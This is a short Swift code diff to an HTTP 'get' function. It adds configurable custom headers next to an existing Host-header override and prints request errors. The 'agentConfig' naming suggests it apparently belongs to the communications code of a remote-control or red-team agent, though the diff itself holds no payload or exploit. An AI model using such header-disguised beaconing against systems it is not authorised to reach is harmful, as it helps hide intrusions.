@@ -43,10 +43,18 @@ func get(data: String) -> String {
     else {
         request.setValue(agentConfig.hostHeader, forHTTPHeaderField: "Host")
     }
+    if !agentConfig.httpHeaders.isEmpty {
+        for header in agentConfig.httpHeaders {
+            request.setValue(header.value, forHTTPHeaderField: header.key)
+        }
+    }
     
     // Perform HTTP Request
-    let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, _, _ in
-         results = String(data: data ?? toData(string: "NO_CONNECT"), encoding: .utf8)!
+    let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, _, error in
+        if (error != nil) {
+            print(error)
+        }
+        results = String(data: data ?? toData(string: "NO_CONNECT"), encoding: .utf8)!
         dispatch.leave()
     }
     task.resume()
